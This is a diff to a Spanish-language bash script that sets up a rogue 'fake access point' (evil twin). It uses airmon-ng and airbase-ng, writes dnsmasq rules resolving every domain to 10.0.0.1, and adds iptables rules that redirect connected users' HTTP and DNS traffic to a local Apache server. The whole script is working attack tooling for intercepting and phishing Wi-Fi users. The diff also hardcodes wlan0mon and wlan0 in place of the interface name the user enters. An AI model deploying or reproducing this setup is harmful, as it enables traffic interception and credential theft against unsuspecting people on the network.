@@ -29,22 +29,31 @@ echo -e "${amarillo}"
 read -p "Por favor pon el nombre de tu Interface de red: " InterfaceRed
 echo -e "${endColour}"
 
-# Verificación de existencia de la interfaz
-if ! ip link show "$InterfaceRed" > /dev/null 2>&1; then
-    echo -e "${rojo}La interfaz $InterfaceRed no existe.${endColour}"
-    exit 1
+# Comprobar si la interfaz ya está en modo monitor
+if ip link show | grep -q "${InterfaceRed}mon"; then
+    echo -e "\n\n${azul}La interfaz ya está en modo monitor: ${InterfaceRed}mon${endColour}\n\n"
+else
+    # Poner la interfaz en modo monitor
+    airmon-ng start $InterfaceRed
+    if [ $? -ne 0 ]; then
+        echo -e "${rojo}Error al poner la interfaz en modo monitor.${endColour}"
+        exit 1
+    fi
+    echo -e "\n\n${azul}Interface de red puesta en modo monitor${endColour}\n\n"
 fi
 
-# Poner la interfaz en modo monitor
-interfaz_monitor=$(airmon-ng start "$InterfaceRed" | grep "monitor mode" | awk '{print $NF}')
-if [ -z "$interfaz_monitor" ]; then
-    echo -e "${rojo}Error al poner la interfaz en modo monitor.${endColour}"
-    exit 1
+# Configuración de dnsmasq
+if ! grep -q "interface=" /etc/dnsmasq.conf; then
+    echo "interface=${InterfaceRed}mon" | sudo tee -a /etc/dnsmasq.conf
+    echo "dhcp-range=10.0.0.2,10.0.0.20,255.255.255.0,24h" | sudo tee -a /etc/dnsmasq.conf
+    echo "address=/#/10.0.0.1" | sudo tee -a /etc/dnsmasq.conf
+    echo -e "${azul}Configuración de dnsmasq añadida a /etc/dnsmasq.conf${endColour}"
+else
+    echo -e "${amarillo}La configuración de dnsmasq ya existe.${endColour}"
 fi
-echo -e "\n\n${azul}Interface de red puesta en modo monitor: $interfaz_monitor${endColour}\n\n"
 
 # Nombre del punto de acceso falso
-echo -e "${amarillo}Escriba como quieres que se llame tu punto de acceso falso:${endColour}"
+echo -e "\e[0;33mEscriba como quieres que se llame tu punto de acceso falso: \e[0m"
 read NameAP
 if [ -z "$NameAP" ]; then
     echo -e "${rojo}El nombre del punto de acceso no puede estar vacío.${endColour}"
@@ -52,7 +61,7 @@ if [ -z "$NameAP" ]; then
 fi
 
 # Selección del canal
-echo -e "${amarillo}Ahora dime el canal que deseas utilizar (debe ser del 1 hasta el 12):${endColour}"
+echo -e "\e[0;33mAhora dime el canal que deseas utilizar (debe ser del 1 hasta el 12): \e[0m"
 read Canal
 if ! [[ "$Canal" =~ ^[1-9]$|^1[0-2]$ ]]; then
     echo -e "${rojo}Canal inválido. Debe ser un número del 1 al 12.${endColour}"
@@ -60,15 +69,15 @@ if ! [[ "$Canal" =~ ^[1-9]$|^1[0-2]$ ]]; then
 fi
 
 # Creación del punto de acceso falso
-airbase-ng -e "$NameAP" -c "$Canal" "$interfaz_monitor" &
+airbase-ng -e "$NameAP" -c "$Canal" wlan0mon &
 sleep 5
 echo -e "\n\n${gris}Punto de acceso creado${endColour}\n\n"
 
 # Configuración de iptables para redirigir tráfico HTTP y DNS
 sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:80
 sudo iptables --table nat --append PREROUTING --protocol udp --dport 53 --jump DNAT --to-destination 10.0.0.1:53
-sudo iptables --append FORWARD --in-interface "$interfaz_monitor" --jump ACCEPT
-sudo iptables --table nat --append POSTROUTING --out-interface "$InterfaceRed" --jump MASQUERADE
+sudo iptables --append FORWARD --in-interface wlan0mon --jump ACCEPT
+sudo iptables --table nat --append POSTROUTING --out-interface wlan0 --jump MASQUERADE
 
 # Iniciar dnsmasq y Apache
 sudo dnsmasq -C /etc/dnsmasq.conf -d &
@@ -90,11 +99,11 @@ cleanup() {
     echo -e "${amarillo}Limpiando configuraciones y deteniendo servicios...${endColour}"
     sudo iptables --table nat --delete PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:80
     sudo iptables --table nat --delete PREROUTING --protocol udp --dport 53 --jump DNAT --to-destination 10.0.0.1:53
-    sudo iptables --delete FORWARD --in-interface "$interfaz_monitor" --jump ACCEPT
-    sudo iptables --table nat --delete POSTROUTING --out-interface "$InterfaceRed" --jump MASQUERADE
+    sudo iptables --delete FORWARD --in-interface wlan0mon --jump ACCEPT
+    sudo iptables --table nat --delete POSTROUTING --out-interface wlan0 --jump MASQUERADE
     sudo pkill dnsmasq
     sudo systemctl stop apache2
-    airmon-ng stop "$interfaz_monitor"
+    airmon-ng stop wlan0mon
 }
 
 trap cleanup EXIT
